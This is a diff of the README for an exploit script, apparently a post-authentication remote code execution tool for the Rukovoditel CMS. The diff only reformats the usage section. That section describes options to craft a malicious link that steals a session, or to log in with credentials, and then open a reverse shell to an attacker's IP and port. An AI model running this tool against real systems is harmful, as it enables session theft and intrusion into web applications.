@@ -8,19 +8,17 @@ With the --type L option, this script will create a malicious link, if the link 
 Protip: remember to check if the registration module is enabled ;)
 
 # Usage
-  exploit.py -t <target> -a L --ip attacker IP --port attacker port [options]
-  exploit.py -t <target> -a C -u <username> -p <password> --ip attacker IP --port attacker port [options]
+exploit.py -t <target> -a L --ip attacker IP --port attacker port [options]
+exploit.py -t <target> -a C -u <username> -p <password> --ip attacker IP --port attacker port [options]
+
+Post-authenticate RCE for rukovoditel, script version 1.0
   
-  Post-authenticate RCE for rukovoditel, script version 1.0
-  
-  optional arguments:
-    -h, --help            show this help message and exit
-    -t URL, --target URL  URL/Full path to CMS Rukovoditel http://url/path/to/cms/
-    -u USER, --user USER  Username for authentication
-    -p PASSWORD, --password PASSWORD
-                        Password for authentication
-    -a TYPE, --type TYPE  Use -a L to generate the link and steal the session or use -a C if you have access
-                        credentials to the web application
-    --ip IP_ATTACKER      IP attacker for reverse shell!
-    --port PORT_ATTACKER  Port for reverse shell connection
-    --proxy PROXY         Setup http proxy for debbugin http://127.0.0.1:8080
+optional arguments:
+-h, --help            show this help message and exit
+-t URL, --target URL  URL/Full path to CMS Rukovoditel http://url/path/to/cms/
+-u USER, --user USER  Username for authentication
+-p PASSWORD, --password PASSWORD Password for authentication
+-a TYPE, --type TYPE  Use -a L to generate the link and steal the session or use -a C if you have access credentials to the web application
+--ip IP_ATTACKER      IP attacker for reverse shell!
+--port PORT_ATTACKER  Port for reverse shell connection
+--proxy PROXY         Setup http proxy for debbugin http://127.0.0.1:8080
